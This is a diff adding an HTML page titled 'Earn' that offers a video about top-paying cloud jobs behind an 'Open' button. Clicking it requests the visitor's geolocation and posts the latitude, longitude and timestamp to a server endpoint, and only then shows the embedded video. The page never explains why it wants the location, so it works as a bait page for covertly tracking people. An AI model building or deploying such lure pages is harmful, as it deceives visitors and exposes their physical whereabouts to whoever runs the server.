@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Earn</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: sans-serif;
+      padding: 50px;
+      background: #f4f4f4;
+    }
+
+    button {
+      padding: 12px 24px;
+      background-color: #007bff;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    #videoContainer {
+      display: none;
+      margin-top: 40px;
+    }
+
+    iframe {
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 720px;
+      height: 405px;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>Open  Video</h2>
+  <p>Please by clicking below:</p>
+  <button onclick="shareLocation()">Open</button>
+  <p id="status"></p>
+
+  <div id="videoContainer">
+    <h3>🎥 Top Cloud Jobs with Highest Packages</h3>
+    <iframe id="ytFrame" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+  </div>
+
+  <script>
+    function shareLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          document.getElementById('status').innerText = "Sending location...";
+
+          fetch('/api/save-location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              timestamp: new Date().toISOString()
+            })
+          })
+          .then(res => res.json())
+          .then(data => {
+            document.getElementById('status').innerText = "✅ Fetch  successfully.";
+
+            // Show video iframe
+            const ytURL = "https://www.youtube.com/embed/X5qoqwoJrrc"; // Your YouTube video in embed format
+            document.getElementById('ytFrame').src = ytURL;
+            document.getElementById('videoContainer').style.display = 'block';
+          });
+        }, function () {
+          alert("❌ Location permission denied.");
+        });
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+  </script>
+</body>
+</html>
